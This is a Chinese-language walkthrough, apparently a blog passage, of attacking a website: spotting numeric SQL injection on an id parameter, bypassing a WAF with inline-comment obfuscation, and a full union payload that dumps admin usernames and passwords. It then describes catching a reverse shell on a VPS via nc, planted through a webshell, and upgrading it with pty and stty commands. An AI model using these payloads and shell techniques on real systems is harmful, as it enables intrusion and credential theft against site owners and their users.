# **0x02漏洞挖掘**

先在域名后随手加一个**admin**找到后台。

![](../Images/dd35dc8b9dc4cda592f93581de9ab5a5.png)

  

回到前台，随意点点，发现可疑参数**id**  

![](../Images/d7e5cac81f6ebafe95ac88665e5d6c6e.png)

  

**?id=125 and 1=0 ** 页面变空白**?id=125 and 1=1 ** 页面恢复正常确认存在数字型注入，数字型注入的payload后面一般不用加注释（图略，打码太累了）

![](../Images/28c60ba00aa3d0d5cdf39cc053a60522.png)

  

**?id=125 order by 7** 页面正常**?id=125 order by 8 **页面报错确认注入点查询7列（图略，打码太累了）

![](../Images/28c60ba00aa3d0d5cdf39cc053a60522.png)

 

**?id=125 union select 1,2,3,4,5,6,7  **使用union联合查询注入确认回显点时存在问题，页面迟迟无响应。

  

![](../Images/a250cc3aefc8ef0746797ab3f701a263.png)

 

猜想是有waf做了过滤，接下来逐步测试waf到底过滤了什么东西。每个waf都有自己的过滤特征（以前的安全狗是出现一只狗），可以判断该waf的过滤特征就是页面无响应，所以出现其他情况（正常回显，数据库报错等）都可判断是绕过waf成功。

  

**?id=125 union **页面报错而不是无响应，说明waf没有过滤union

![](../Images/195d3483c366ac7570b21cdae6fc0e6b.png)

 

**?id=125 union select **页面无响应，说明过滤了select或union select

![](../Images/566674f30a3c7a22076e5c9a71a4553e.png)

   

**?id=125 union sElecT **关键字大小写混用尝试绕过，页面依旧无响应，绕过失败（图略）**?id=125 union /\*!sElecT\*/ **mysql内联注释尝试绕过过滤，页面报错，绕过成功！

![](../Images/013837e2b813cb8f0645950d17e72631.png)

 

**?id=125 union /\*!sElecT\*/ 1,2,3,4,5,6,7 **确认回显列，却没有在页面发现数字回显，依旧是正常显示着新闻。（图略，打码太累了）

![](../Images/28c60ba00aa3d0d5cdf39cc053a60522.png)

  

**?id=0 union /\*!sElecT\*/ 1,2,3,4,5,6,7 **怀疑是代码没有用循环输出，所以只能显示查询出的第一列，正常查询的结果干扰了我们注入的回显。于是更改前面的id为0，让程序查不出正常的数据，成功发现第2和第5列回显

![](../Images/f948ac4edcdf929d90be06c92d86cc06.png)

通过information\_schema数据库找表找列的注入过程略，最终查出管理员账号密码的payload如下(中间又被waf拦了一次，于是将内联注释做了一个升级，空格和union关键字也做了混淆最终绕过)：**id=0/\*\*/UniOn/\*\*//\*!50000sEleCt\*/1,2,3,4,group\_concat(concat\_ws(‘@’,username,pwd) separator ‘<br>’),6,7/\*\*/From/\*\*/admin**  
这里解释一下，concat\_ws函数是将多个列的结果合并返回，以第一个参数为分割符。group\_concat则是多个行的结果合并返回，以separator后面指定的参数(换行符)为分隔符，于是一条payload即可注出表中所有数据。

![](../Images/0fc3cd9fb852c05a71f5580a15f068d1.png)

# **0x03 反弹shell**

用户权限不高，接下来尝试提权

![](../Images/03dd3f7f5c76038c23f1dc6690138c93.png)

 

因为webshell基于http协议（无状态协议），前后操作没有关联，提权成功后下次操作还是会回到原点。所以要先反弹一个shell出来，这里用自己的vps，先关闭vps的防火墙。

![](../Images/80faf8afbb806f34d71bcb090f293cef.png)

 

然后在vps上用nc监听9999端口。

![](../Images/7b46cad798bc1500e8d3a916691a98a7.png)

   

用webshell给目标服务器写入一个py的反弹脚本。

![](../Images/475481b58e32d0c8e3a8cfa723fbe2e3.png)

  

在蚁剑上执行py脚本，可以看到vps上成功接收到shell。

![](../Images/de42ee3291309248e39d8cb5cf4802a3.png)

 

此时的shell仍然不是一个交互式shell，不能执行交互性工作和su命令，需要用pty库模拟一个终端出来，并用stty升级成完全交互式shell。

![](../Images/3d5dd76f3d89b8b9c79d1b278e0a4f28.png)

看图不清楚的，文字描述过程如下：

*//**这里是在受害机反弹回的**shell**里的操作，先用**pty**把**shell**提升成半交互，然后**Ctrl+Z**挂起*

*$ python -c 'import pty;pty.spawn("/bin/bash")'*

*Ctrl+Z*

*//**这里是反弹**shell**挂起后在本机**shell**里的操作，**stty**升级后用**fg**把挂起的**shell**调出到前台*

*$ stty raw -echo*

*$ fg*

*//**这里重新进入了反弹**shell**，一开始页面会有点怪，执行了**reset**后就会恢复*

*$ reset*

*$ export SHELL=bash*

*$ export TERM=xterm-256color*

*$ stty rows <num>columns <cols>*
